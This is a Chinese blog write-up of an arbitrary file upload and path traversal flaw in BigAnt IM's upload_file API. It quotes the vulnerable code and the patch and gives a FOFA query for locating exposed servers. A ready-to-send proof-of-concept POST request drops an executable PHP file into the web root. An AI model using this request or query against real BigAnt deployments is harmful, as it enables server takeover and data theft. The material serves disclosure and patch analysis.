---
title: "大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞"
source: https://mrxn.net/jswz/bigant-upload_file-rce.html
asset_dir: assets/大蚂蚁-(bigant)-即时通讯系统-upload_file-任意文件上传漏洞
---

# 大蚂蚁 (BigAnt) 即时通讯系统 upload\_file 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/6 11:10
- 536浏览
- [0评论](#comment)
- 32分钟阅读

深入探索

软件

im

IM

---

# 漏洞简介

杭州九麒科技大蚂蚁 (BigAnt) 即时通讯系统是一款企业级IM通信管理系统，提供多种功能支持。该系统的 upload\_file 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，攻击者可以通过上传特制的 PHP 文件，执行恶意代码，实现服务器的远程控制，可能导致敏感信息泄露、数据篡改等危害。

短信和即时消息

# 影响版本

BigAnt 5.5.x 及以上版本用户

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-001-363b7956a6c1.webp)](https://image.mrxn.net/88e1f5bf63d74c7b9ce32f3ebbae4e6a.webp)

经过测试，最新版本 6.0.1.20250407.1 也受影响

漏洞预警服务

深入探索

安全研究报告

SQL注入防护

恶意软件分析工具

# fofa语法

> (body="/Public/static/admin/admin\_common.js" && body="/Public/lang/zh-cn.js.js") || title="即时通讯 系统登录" && body="/Public/static/ukey/Syunew3.js"

# 漏洞分析

先看官方漏洞通告

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-002-2864eada658f.webp)](https://image.mrxn.net/c0761f090f2248fbaa36d965b8b0b69c.webp)

`file_info` 参数允许通过 `../` 符号进行路径穿越，绕过预设的存储目录，将恶意文件直接写入 Web 根目录。

防病毒程序与恶意软件

深入探索

安全研究工具

VPN服务

SQL注入检测工具

ok，那我们就直接搜索 `"file_info"`

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-003-4ecd22552afd.webp)](https://image.mrxn.net/75c435c4e9a64c5aac144fbea4de7469.webp)

结果只有一个，指向 Application/Api/Controller/DispersedAddinController.class.php

计算机服务器

或者结合官方的补丁分析

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-004-38ea96673c61.webp)](https://image.mrxn.net/eb52da1a05ed4b79862e9f30d7417e75.webp)

官方的修复说明只有两个文件需要替换，其中一个就是我搜索到的

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-005-095451ced566.webp)](https://image.mrxn.net/a910912acf12470cafbe26b9a4cd357b.webp)

再打开补丁里的DispersedAddinController.class.php文件看下，搜索`file_info`在`upload_file()`方法里有如下修复

短信和即时消息

```
// 不能是 .php, 不能带 ..
if (preg_match('/\.(php|phtml|php3|php7)$/i', $item['file_path'])) {
    Jump::errror(301,"禁止上传非法文件后缀");
}

if (strpos($item['file_path'], '../')) {
    Jump::errror(301,"禁止相对路径");
}
```

在看下存在漏洞而版本`upload_file()`方法

```
public function upload_file(){

    $file_info = I("file_info");
    if(empty($file_info)){
       Jump::errror("3301","file_info is  empty");
    }

    $file_info_arr=json_decode($file_info,true);
    if(empty($file_info_arr)){
       LogWrite("file_info: ".$file_info);
       Jump::errror("3301","file_info json_decode error");

    }

    if($file_info_arr){
       foreach( $file_info_arr as $item ){
          $res = move_uploaded_file($_FILES['file']['tmp_name'], SITE_PATH.'/'.str_replace('[webserver]','',$item['file_path']));
          if($res===false){
             LogWrite("文件移动失败 ".$item['file_path']);
          }
       }
    }
    $res = ExtAttachModel::DD()->addAll($file_info_arr);
    if($res===false){
       $message = "err : ".ExtAttachModel::DD()->getError();
       LogWrite($message);
       Jump::errror("3001",$message);
    }

    Jump::success("添加成功");
}
```

对于`file_info`传入的直接使用json\_decode解析后取出`file_path`的值作为保存上传文件`move_uploaded_file`的路径一部分拼接，没有过滤或校验，因此造成任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)+目录穿越组合上传恶意文件如php webshell到web应用根目录 `htdocs`从而达到[代码执行](https://mrxn.net/tag/rce)、命令执行、甚至控制服务器。

漏洞预警服务

但是我发现我本地测试的时候不需要目录穿越，这也和代码里的`SITE_PATH.'/'.str_replace('[webserver]','',$item['file_path'])`对得上，因为

根据`index.php`中的定义：

```
define('APP_PATH','./Application/');
define('SITE_PATH', __DIR__);
define('RUNTIME_PATH', SITE_PATH.'/Runtime/');
```

`__DIR__` 是PHP 魔术常量，表示**当前脚本所在的目录**。

因此，如果 `index.php` 位于默认安装路径下，`SITE_PATH` 的值应该是：

搜索引擎

```
C:\Program Files\BigAntSoft\AntServer\im_webserver\htdocs
```

假设 `$item['file_path']` 的值是 [webserver]/uploads/2024/file.jpg，那么：

```
SITE_PATH . '/' . str_replace('[webserver]', '', $item['file_path'])
```

最终会生成：

```
C:\Program Files\BigAntSoft\AntServer\im_webserver\htdocs/uploads/2024/file.jpg
```

可能不同版本需要穿越？可尝试穿越到 ../htdocs 目录。

计算机服务器

# 漏洞复现

> 需要注意thinkphp的路由特性，不区分大小写，且还支持如下等方式
>
> /api/dispersedAddin/upload\_file.html
>
> /api/dispersedAddin/upload\_file

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-006-b35d52b2b7c7.webp)](https://image.mrxn.net/080fe90396a2474fbf27e6a770a3d4a3.webp)

```
POST /?m=Api&c=DispersedAddin&a=upload_file HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file_info"

[{"file_path":"test.php"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.txt"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundary--
```

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-007-642e8518b5ca.webp)](https://image.mrxn.net/2b69b08505e44c86adfa895dc1596379.webp)

访问上传文件 test.php

漏洞预警服务

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-008-ae24e4d2296b.webp)](https://image.mrxn.net/9d83b9bbdd91446ca2a92eee6eb7ec58.webp)

成功执行我们上传的文件，并删除自身

[![大蚂蚁 (BigAnt) 即时通讯系统 upload_file 任意文件上传漏洞](images/img-009-0ff8f3ab3e05.webp)](https://image.mrxn.net/c25d575d27464f629d7a37be2115e8ea.webp)

# 参考

- <https://www.bigant.cn/article/news/435.html>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
